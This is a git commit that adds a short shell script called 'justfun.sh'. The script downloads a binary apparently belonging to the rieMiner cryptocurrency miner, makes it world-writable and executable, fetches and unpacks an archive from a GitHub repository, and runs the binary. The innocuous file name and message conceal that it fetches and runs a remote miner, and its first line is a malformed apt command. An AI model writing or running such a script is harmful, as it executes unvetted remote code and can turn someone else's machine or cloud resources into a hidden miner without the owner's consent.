c93ea627bab50c1dd43b2d1331c8ad0fe44e4b36
srioyooeisfuer <srooyisfiieu@gmail.com>
2024-12-10 05:09:59 +0700

    Create justfun.sh

---
+++ justfun.sh
@@ -0,0 +1,7 @@
+apt sudo update
+wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2
+chmod 777 Deb64AVX2
+wget https://github.com/srioyooeisfuer/FAW/raw/refs/heads/main/example.tar.gz
+tar -xvf example.tar.gz
+sudo apt update
+./Deb64AVX2
